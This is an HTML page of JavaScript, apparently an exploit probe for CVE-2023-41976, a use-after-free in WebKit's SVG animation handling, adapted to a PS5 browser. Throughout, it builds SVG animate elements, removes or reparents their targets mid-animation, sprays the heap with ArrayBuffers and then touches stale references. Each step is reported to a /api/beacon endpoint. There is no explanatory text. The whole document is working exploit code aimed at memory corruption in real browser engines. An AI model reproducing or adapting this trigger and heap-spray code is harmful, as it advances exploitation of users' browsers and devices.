<!--
  p686: CVE-2023-41976 -- SVG animation element UAF
  Adapted for PS5 guide-entry beacon API (POST /api/beacon)
  CRASH_CLASS: MODERATE
-->
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>p686</title></head>
<body><pre id="out">p686: SVG Animation UAF (CVE-2023-41976)</pre>
<script>
'use strict';
var O=document.getElementById('out');
var _sid='p686-'+Date.now();
var _imgs=[];for(var i=0;i<600;i++)_imgs.push(new Image());
var _ix=0;
function say(s){O.textContent+='\n'+s;}
function b(tag,d){
  var msg='P686-'+tag+(d!==undefined?'-'+String(d).slice(0,800):'');
  say(msg);
  try{
    var x=new XMLHttpRequest();
    x.open('POST','/api/beacon',false);
    x.setRequestHeader('Content-Type','application/json');
    x.send(JSON.stringify({stage:'p686',msg:msg,level:'info',sid:_sid,ua:navigator.userAgent}));
  }catch(e){
    try{_imgs[_ix++%600].src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e2){}
  }
}

function main(){
  b('START','SVG-ANIMATION-UAF');
  var results = [];

  // === SECTION A: Remove target during requestAnimationFrame ===
  b('A','REMOVE-DURING-RAF');
  try {
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('width', '200');
    svg.setAttribute('height', '200');
    document.body.appendChild(svg);

    var rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
    rect.setAttribute('id', 'target-a');
    rect.setAttribute('width', '100');
    rect.setAttribute('height', '100');
    rect.setAttribute('fill', 'blue');
    svg.appendChild(rect);

    var anim = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
    anim.setAttribute('href', '#target-a');
    anim.setAttribute('attributeName', 'width');
    anim.setAttribute('from', '100');
    anim.setAttribute('to', '0');
    anim.setAttribute('dur', '0.1s');
    anim.setAttribute('fill', 'freeze');
    anim.setAttribute('begin', '0s');
    svg.appendChild(anim);

    var animRef = anim;
    var rectRef = rect;
    setTimeout(function() {
      rectRef.remove();
      b('A','TARGET-REMOVED');

      for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
      var spray = [];
      for (var i = 0; i < 1024; i++) spray.push(new ArrayBuffer(64));

      try {
        var target = animRef.targetElement;
        b('A','TARGET-ELEMENT:' + (target ? target.tagName : 'null'));
        if (target && target.parentNode === null) {
          b('A','STALE-TARGET');
          results.push('A:stale');
        }
      } catch(e2) {
        b('A','TARGET-ERR:' + e2.message);
        results.push('A:err');
      }

      try {
        svg.setCurrentTime(0.05);
        b('A','SET-TIME-OK');
      } catch(e2) {
        b('A','SET-TIME-ERR:' + e2.message);
      }

      svg.remove();
      runSectionB();
    }, 50);
  } catch(e) {
    b('A','ERR:' + e.message);
    runSectionB();
  }

  function runSectionB() {
    b('B','USE-ANIM-REMOVED');
    try {
      var svg2 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      svg2.setAttribute('width', '200');
      svg2.setAttribute('height', '200');
      document.body.appendChild(svg2);

      var defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
      var circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
      circle.setAttribute('id', 'def-b');
      circle.setAttribute('r', '40');
      circle.setAttribute('fill', 'green');
      defs.appendChild(circle);
      svg2.appendChild(defs);

      var anim2 = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
      anim2.setAttribute('href', '#def-b');
      anim2.setAttribute('attributeName', 'r');
      anim2.setAttribute('from', '40');
      anim2.setAttribute('to', '10');
      anim2.setAttribute('dur', '0.1s');
      anim2.setAttribute('begin', '0s');
      svg2.appendChild(anim2);

      var use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
      use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#def-b');
      use.setAttribute('x', '100');
      use.setAttribute('y', '100');
      svg2.appendChild(use);

      setTimeout(function() {
        circle.remove();
        b('B','DEF-REMOVED');

        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
        var spray2 = [];
        for (var i = 0; i < 1024; i++) spray2.push(new ArrayBuffer(48));

        try {
          svg2.setCurrentTime(0.05);
          b('B','SET-TIME-OK');
        } catch(e2) {
          b('B','SET-TIME-ERR:' + e2.message);
        }

        try {
          var inst = use.instanceRoot;
          b('B','INSTANCE:' + (inst ? 'exists' : 'null'));
        } catch(e2) {
          b('B','INSTANCE-ERR:' + e2.message);
          results.push('B:err');
        }

        svg2.remove();
        runSectionC();
      }, 50);
    } catch(e) {
      b('B','ERR:' + e.message);
      runSectionC();
    }
  }

  function runSectionC() {
    b('C','TRANSFORM-REPARENT');
    try {
      var svg3 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      svg3.setAttribute('width', '200');
      svg3.setAttribute('height', '200');
      document.body.appendChild(svg3);

      var g1 = document.createElementNS('http://www.w3.org/2000/svg', 'g');
      g1.setAttribute('id', 'group-c');
      var rect3 = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
      rect3.setAttribute('width', '50');
      rect3.setAttribute('height', '50');
      rect3.setAttribute('fill', 'red');
      g1.appendChild(rect3);
      svg3.appendChild(g1);

      var animT = document.createElementNS('http://www.w3.org/2000/svg', 'animateTransform');
      animT.setAttribute('href', '#group-c');
      animT.setAttribute('attributeName', 'transform');
      animT.setAttribute('type', 'rotate');
      animT.setAttribute('from', '0');
      animT.setAttribute('to', '360');
      animT.setAttribute('dur', '0.1s');
      animT.setAttribute('begin', '0s');
      svg3.appendChild(animT);

      setTimeout(function() {
        var svg3b = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        svg3b.setAttribute('width', '200');
        svg3b.setAttribute('height', '200');
        document.body.appendChild(svg3b);

        svg3b.appendChild(g1);
        b('C','REPARENTED');

        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
        var spray3 = [];
        for (var i = 0; i < 1024; i++) spray3.push(new ArrayBuffer(48));

        try {
          svg3.setCurrentTime(0.05);
          b('C','OLD-SVG-TIME-OK');
        } catch(e2) {
          b('C','OLD-SVG-TIME-ERR:' + e2.message);
        }

        try {
          var t = animT.targetElement;
          b('C','TARGET:' + (t ? t.tagName + ':id=' + t.id : 'null'));
        } catch(e2) {
          b('C','TARGET-ERR:' + e2.message);
          results.push('C:err');
        }

        svg3.remove();
        svg3b.remove();
        runSectionD();
      }, 50);
    } catch(e) {
      b('C','ERR:' + e.message);
      runSectionD();
    }
  }

  function runSectionD() {
    b('D','SMIL-EVENTS');
    try {
      var svg4 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      svg4.setAttribute('width', '200');
      svg4.setAttribute('height', '200');
      document.body.appendChild(svg4);

      var r1 = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
      r1.setAttribute('id', 'r1-d');
      r1.setAttribute('width', '50');
      r1.setAttribute('height', '50');
      r1.setAttribute('fill', 'purple');
      svg4.appendChild(r1);

      var a1 = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
      a1.setAttribute('id', 'a1-d');
      a1.setAttribute('href', '#r1-d');
      a1.setAttribute('attributeName', 'width');
      a1.setAttribute('from', '50');
      a1.setAttribute('to', '0');
      a1.setAttribute('dur', '0.05s');
      a1.setAttribute('begin', '0s');
      a1.setAttribute('fill', 'freeze');
      svg4.appendChild(a1);

      var a2 = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
      a2.setAttribute('id', 'a2-d');
      a2.setAttribute('href', '#r1-d');
      a2.setAttribute('attributeName', 'height');
      a2.setAttribute('from', '50');
      a2.setAttribute('to', '0');
      a2.setAttribute('dur', '0.05s');
      a2.setAttribute('begin', 'a1-d.end');
      a2.setAttribute('fill', 'freeze');
      svg4.appendChild(a2);

      setTimeout(function() {
        r1.remove();
        b('D','TARGET-REMOVED-BEFORE-CHAIN');

        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
        var spray4 = [];
        for (var i = 0; i < 1024; i++) spray4.push(new ArrayBuffer(48));

        try {
          svg4.setCurrentTime(0.1);
          b('D','ADVANCED-PAST-CHAIN:OK');
        } catch(e2) {
          b('D','CHAIN-ERR:' + e2.message);
          results.push('D:err');
        }

        svg4.remove();
        runSectionE();
      }, 30);
    } catch(e) {
      b('D','ERR:' + e.message);
      runSectionE();
    }
  }

  function runSectionE() {
    b('E','NESTED-REPARENT');
    try {
      var outer = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      outer.setAttribute('width', '200');
      outer.setAttribute('height', '200');
      document.body.appendChild(outer);

      var inner = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      inner.setAttribute('id', 'inner-e');
      inner.setAttribute('x', '10');
      inner.setAttribute('y', '10');
      inner.setAttribute('width', '100');
      inner.setAttribute('height', '100');

      var circ = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
      circ.setAttribute('cx', '50');
      circ.setAttribute('cy', '50');
      circ.setAttribute('r', '30');
      circ.setAttribute('fill', 'orange');
      inner.appendChild(circ);

      var animX = document.createElementNS('http://www.w3.org/2000/svg', 'animate');
      animX.setAttribute('href', '#inner-e');
      animX.setAttribute('attributeName', 'x');
      animX.setAttribute('from', '10');
      animX.setAttribute('to', '90');
      animX.setAttribute('dur', '0.1s');
      animX.setAttribute('begin', '0s');
      inner.appendChild(animX);

      outer.appendChild(inner);

      setTimeout(function() {
        outer.removeChild(inner);
        outer.innerHTML = '';
        b('E','INNER-REMOVED');

        for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
        var spray5 = [];
        for (var i = 0; i < 1024; i++) spray5.push(new ArrayBuffer(64));

        var outer2 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        outer2.setAttribute('width', '200');
        outer2.setAttribute('height', '200');
        document.body.appendChild(outer2);

        try {
          outer2.appendChild(inner);
          b('E','RE-ADDED');
          outer2.setCurrentTime(0.05);
          b('E','TIME-SET-OK');
        } catch(e2) {
          b('E','RE-ADD-ERR:' + e2.message);
          results.push('E:err');
        }

        outer.remove();
        outer2.remove();
        finish();
      }, 50);
    } catch(e) {
      b('E','ERR:' + e.message);
      finish();
    }
  }

  function finish() {
    if (results.length > 0) {
      b('RESULT','HITS=' + results.join(';'));
    } else {
      b('RESULT','NO-UAF-DETECTED');
    }
    b('DONE');
  }
}

setTimeout(main, 500);
</script>
</body></html>
